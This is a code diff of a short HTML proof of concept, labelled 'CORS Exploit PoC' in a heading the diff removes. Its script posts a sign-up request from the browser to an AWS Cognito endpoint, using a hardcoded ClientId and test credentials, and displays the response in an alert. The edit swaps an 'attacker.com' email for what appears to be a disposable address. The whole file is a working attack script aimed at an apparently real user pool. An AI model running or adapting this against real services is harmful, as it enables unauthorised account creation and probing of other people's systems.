@@ -1,7 +1,6 @@
 <!DOCTYPE html>
 <html>
   <body>
-    <h2>CORS Exploit PoC</h2>
     <script>
       fetch("https://cognito-idp.sa-east-1.amazonaws.com", {
         method: "POST",
@@ -11,16 +10,18 @@
         },
         body: JSON.stringify({
           ClientId: "2h2spdqaft80q2o5l5r52h3e7l",
-          Username: "corspoc2025",
-          Password: "Secure123@!",
+          Username: "wepire9571@balincs.com",
+          Password: "SecureTest@123!",
           UserAttributes: [
             {
               Name: "email",
-              Value: "cors@attacker.com"
+              Value: "wepire9571@balincs.com"
             }
           ]
         })
-      }).then(res => res.text()).then(alert);
+      })
+        .then(res => res.text())
+        .then(alert);
     </script>
   </body>
 </html>
